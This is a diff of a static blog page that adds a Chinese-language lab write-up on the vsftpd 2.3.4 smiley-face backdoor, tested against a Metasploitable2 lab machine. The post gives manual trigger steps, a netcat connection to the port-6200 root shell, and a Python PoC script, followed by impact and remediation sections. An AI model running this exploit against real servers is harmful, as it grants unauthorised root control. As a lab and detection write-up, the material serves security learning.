@@ -112,11 +112,151 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/11/02/curl%E5%91%BD%E4%BB%A4%E5%AE%9E%E9%AA%8C/" data-id="cuidxGP9pukycztVkcvAQmCGa" data-title="curl命令体验实验" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/11/02/curl%E5%91%BD%E4%BB%A4%E5%AE%9E%E9%AA%8C/" data-id="cuidNeqtBGxwuq3M0mYgtvh2G" data-title="curl命令体验实验" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/API%E8%B0%83%E8%AF%95/" rel="tag">API调试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/curl/" rel="tag">curl</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" rel="tag">命令行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-笑脸实验" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/11/02/%E7%AC%91%E8%84%B8%E5%AE%9E%E9%AA%8C/" class="article-date">
+  <time class="dt-published" datetime="2026-11-02T12:00:00.000Z" itemprop="datePublished">2026-11-02</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/11/02/%E7%AC%91%E8%84%B8%E5%AE%9E%E9%AA%8C/">vsftpd 笑脸漏洞检测PoC（Python）实验</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>vsftpd 笑脸漏洞检测PoC（Python）实验</p>
+<p>一、漏洞简介</p>
+<p>vsftpd（Very Secure FTP Daemon） 是 Linux 系统中非常常用、轻量且高性能的 FTP 文件传输服务程序。</p>
+<p>其中 2.3.4 版本并非代码漏洞，而是人为恶意植入后门：<br>只要攻击者在 FTP 登录时，用户名包含笑脸字符 :)，程序会自动在靶机 6200 端口开启一个无密码 Root 最高权限 Shell，攻击者可直接完全控制服务器。</p>
+<p>二、实验环境</p>
+<p>• 攻击机：Kali Linux</p>
+<p>• 靶机环境：Metasploitable2</p>
+<p>• 靶机 IP：192.168.17.132</p>
+<p>三、漏洞原理</p>
+<p>vsftpd 2.3.4 内置恶意后门逻辑：</p>
+<ol>
+<li><p>接收 FTP 用户名字符串</p>
+</li>
+<li><p>匹配到特殊字符 :) 笑脸符号</p>
+</li>
+<li><p>后台自动监听 6200 端口</p>
+</li>
+<li><p>对外提供无需认证的 root 权限 Shell</p>
+</li>
+</ol>
+<p>因此攻击者可以不用密码、不用复杂利用，直接拿下服务器最高权限。</p>
+<p>四、手动漏洞复现过程</p>
+<ol>
+<li><p>靶机开机登录 msfadmin &#x2F; msfadmin，通过 ifconfig 获取靶机 IP</p>
+</li>
+<li><p>Kali 终端连接靶机 FTP 服务：<br>ftp 192.168.17.132</p>
+</li>
+<li><p>用户名输入 test:)，密码任意填写</p>
+</li>
+<li><p>终端卡住即为 后门触发成功</p>
+</li>
+<li><p>新开终端使用 nc 连接后门端口：<br>nc 192.168.17.132 6200</p>
+</li>
+<li><p>输入权限验证命令：<br>id<br>成功返回 uid&#x3D;0(root)，说明已获取服务器最高权限，漏洞复现成功。<br><img src="/img/vsftpd_root.png" alt="图1 手动复现获取root权限截图"><br>五、Python PoC 脚本编写与自动化测试过程</p>
+</li>
+</ol>
+<p>为避免手动 FTP 卡死、操作繁琐，本次实验自主编写 Python PoC 自动化检测脚本，实现一键检测目标是否存在 vsftpd 笑脸后门。</p>
+<p>1.PoC 源码<br>import socket<br>from ftplib import FTP</p>
+<p>def check_vsftpd_smile_vuln(target_ip, ftp_port&#x3D;21, backdoor_port&#x3D;6200):<br>    try:<br>        # 触发后门<br>        ftp &#x3D; FTP()<br>        ftp.connect(target_ip, ftp_port, timeout&#x3D;3)<br>        ftp.login(“test:)”, “123456”)<br>        ftp.quit()<br>    except Exception:<br>        pass</p>
+<pre><code>try:
+    # 连接后门端口验证权限
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(2)
+    s.connect((target_ip, backdoor_port))
+    s.send(b&quot;id\n&quot;)
+    res = s.recv(512).decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)
+    print(&quot;✅ 目标存在 vsftpd 2.3.4 笑脸后门！&quot;)
+    print(&quot;权限回显：&quot;, res)
+    s.close()
+except Exception:
+    print(&quot;❌ 目标无该漏洞&quot;)
+</code></pre>
+<p>if <strong>name</strong> &#x3D;&#x3D; “<strong>main</strong>“:<br>    ip &#x3D; input(“请输入靶机IP：”)<br>    check_vsftpd_smile_vuln(ip)<br>2.脚本测试完整过程</p>
+<ol>
+<li><p>在 Kali 终端使用 nano 创建脚本文件：<br>nano smile_poc.py</p>
+</li>
+<li><p>将完整 Python 代码粘贴进文件</p>
+</li>
+<li><p>Ctrl+O 保存、Ctrl+X 退出编辑器</p>
+</li>
+<li><p>执行脚本：<br>python3 smile_poc.py</p>
+</li>
+<li><p>输入靶机 IP：192.168.17.132</p>
+</li>
+</ol>
+<p>脚本自动完成：</p>
+<p>• 连接 FTP 21端口</p>
+<p>• 携带笑脸用户名触发后门</p>
+<p>• 自动连接 6200 后门端口</p>
+<p>• 自动读取系统权限信息、判断漏洞是否存在</p>
+<p>实现 一键自动化漏洞检测，替代人工繁琐操作。</p>
+<p>六、漏洞危害</p>
+<ol>
+<li><p>无需账号密码即可获取服务器 Root 最高权限</p>
+</li>
+<li><p>可任意读取、篡改、删除服务器全部文件数据</p>
+</li>
+<li><p>可植入木马、持久控制服务器</p>
+</li>
+<li><p>一旦公网开放 21 端口，服务器极易被批量沦陷</p>
+</li>
+</ol>
+<p>七、修复方案</p>
+<ol>
+<li><p>立即卸载 vsftpd 2.3.4，升级至最新安全版本</p>
+</li>
+<li><p>防火墙限制 21 端口访问，禁止对公网暴露</p>
+</li>
+<li><p>上线前对所有服务版本进行漏洞筛查</p>
+</li>
+<li><p>禁止使用存在已知后门、高危漏洞的老旧组件</p>
+</li>
+</ol>
+<p>八、实验总结</p>
+<p>本次实验首先完成 手动 FTP+NC 漏洞复现，直观理解笑脸后门触发机制；再通过 自主编写 Python PoC 实现自动化检测，规避了手动操作卡死、步骤繁琐的问题。</p>
+<p>本次实验让我理解到：vsftpd 笑脸漏洞属于人为植入后门，并非普通程序 Bug，危害性极高。同时掌握了简单 Socket 漏洞检测脚本的编写思路，提升了自动化渗透与漏洞验证能力。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/11/02/%E7%AC%91%E8%84%B8%E5%AE%9E%E9%AA%8C/" data-id="cuidNDe8M7vFo5bZl9cKxcc44" data-title="vsftpd 笑脸漏洞检测PoC（Python）实验" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PoC/" rel="tag">PoC</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%8E%E9%97%A8/" rel="tag">后门</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
 
     </footer>
   </div>
@@ -300,7 +440,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/19/Wireshark-qq-capture/" data-id="cuidEXv-XL2JBlfLhqW_blEGG" data-title="QQ流量分析：新版QQ图片传输是明文吗？——基于Wireshark的抓包实验" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/10/19/Wireshark-qq-capture/" data-id="cuidXzSYugaFXcsLQOPDMBK87" data-title="QQ流量分析：新版QQ图片传输是明文吗？——基于Wireshark的抓包实验" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -367,7 +507,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/09/28/post%E5%AF%B9%E4%BA%8E%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%90%86%E8%A7%A3%E4%BD%9C%E4%B8%9A/" data-id="cuidkEK5fQ3uusVLgrTSrgJDU" data-title="对于等保2.0的理解" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/09/28/post%E5%AF%B9%E4%BA%8E%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%90%86%E8%A7%A3%E4%BD%9C%E4%B8%9A/" data-id="cuidOzRK1MgUfJsUEfBZuQY0W" data-title="对于等保2.0的理解" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -420,7 +560,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2026/09/22/hello-world/" data-id="cuidwUKPiXL-1q0NG43H_APlc" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://example.com/2026/09/22/hello-world/" data-id="cuidRoiqeDHhkq90rsjP4_GEM" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -442,7 +582,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
     </div>
   </div>
 
@@ -452,7 +592,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/API%E8%B0%83%E8%AF%95/" rel="tag">API调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QQ/" rel="tag">QQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wireshark/" rel="tag">Wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/" rel="tag">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" rel="tag">命令行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" rel="tag">抓包分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E4%BF%9D2-0/" rel="tag">等保2.0</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" rel="tag">等级保护</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/API%E8%B0%83%E8%AF%95/" rel="tag">API调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PoC/" rel="tag">PoC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/QQ/" rel="tag">QQ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Wireshark/" rel="tag">Wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/" rel="tag">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vsftpd/" rel="tag">vsftpd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%90%8E%E9%97%A8/" rel="tag">后门</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" rel="tag">命令行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" rel="tag">抓包分析</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E4%BF%9D2-0/" rel="tag">等保2.0</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" rel="tag">等级保护</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
     </div>
   </div>
 
@@ -462,7 +602,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/API%E8%B0%83%E8%AF%95/" style="font-size: 10px;">API调试</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/curl/" style="font-size: 10px;">curl</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size: 10px;">命令行</a> <a href="/tags/%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" style="font-size: 10px;">抓包分析</a> <a href="/tags/%E7%AD%89%E4%BF%9D2-0/" style="font-size: 10px;">等保2.0</a> <a href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" style="font-size: 10px;">等级保护</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a>
+      <a href="/tags/API%E8%B0%83%E8%AF%95/" style="font-size: 10px;">API调试</a> <a href="/tags/PoC/" style="font-size: 10px;">PoC</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/QQ/" style="font-size: 10px;">QQ</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/curl/" style="font-size: 10px;">curl</a> <a href="/tags/vsftpd/" style="font-size: 10px;">vsftpd</a> <a href="/tags/%E5%90%8E%E9%97%A8/" style="font-size: 10px;">后门</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size: 10px;">命令行</a> <a href="/tags/%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/" style="font-size: 10px;">抓包分析</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/%E7%AD%89%E4%BF%9D2-0/" style="font-size: 10px;">等保2.0</a> <a href="/tags/%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4/" style="font-size: 10px;">等级保护</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a>
     </div>
   </div>
 
@@ -485,6 +625,10 @@
         
           <li>
             <a href="/2026/11/02/curl%E5%91%BD%E4%BB%A4%E5%AE%9E%E9%AA%8C/">curl命令体验实验</a>
+          </li>
+        
+          <li>
+            <a href="/2026/11/02/%E7%AC%91%E8%84%B8%E5%AE%9E%E9%AA%8C/">vsftpd 笑脸漏洞检测PoC（Python）实验</a>
           </li>
         
           <li>
